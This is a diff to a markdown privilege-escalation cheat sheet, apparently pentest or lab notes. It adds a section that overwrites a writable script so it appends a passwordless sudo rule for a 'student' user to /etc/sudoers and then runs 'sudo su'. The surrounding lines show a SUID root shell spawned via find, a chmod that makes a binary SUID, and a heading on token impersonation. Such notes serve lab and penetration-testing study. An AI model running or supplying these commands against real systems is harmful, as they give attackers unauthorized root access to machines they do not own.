@@ -329,6 +329,18 @@ exploit
 | Find SUID exploit | `find . -exec /bin/sh -p \; -quit` |
 | Make binary SUID | `chmod u+s /tmp/bash` |
 
+### 🧠 Privilege Escalation via Writable Script + `sudo` Misconfiguration
+
+1. **Locate writable script or suspicious file access**:
+
+   ```bash
+   grep -nri "/tmp/message" /usr
+   ls -l /usr/local/share/copy.sh
+   printf '#!/bin/bash\necho "student ALL=NOPASSWD:ALL" >> /etc/sudoers' > /usr/local/share/copy.sh
+   sudo -l
+   sudo su
+   ```
+
 
 ### Privilege Escalation via Token Impersonation
 Using `incognito` to impersonate `blb\Administrator`:
